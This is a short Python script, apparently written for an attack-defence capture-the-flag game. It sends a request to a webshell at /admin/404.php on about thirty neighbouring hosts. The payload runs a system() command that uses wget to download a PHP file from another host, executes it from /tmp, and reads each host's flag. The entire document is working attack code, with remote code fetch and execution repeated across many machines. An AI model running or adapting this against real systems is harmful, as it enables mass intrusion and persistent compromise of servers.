
import requests
url="http://172.20.%d.101/admin/404.php" #backdoor or eval webshell
# eval($_POST['error']);
for i in xrange(101,131,1):
    try:
        if i!=120: #not local
            x=requests.post(url%(i),data={'welcome':'system("wget -q http://172.20.120.5/php.txt -O /tmp/cache.php;php /tmp/cache.php|cat /flag");'},timeout=3)
            print '172.20.%d.101'%(i),x.content #get the ip and flag content
    except:
        print i
        pass
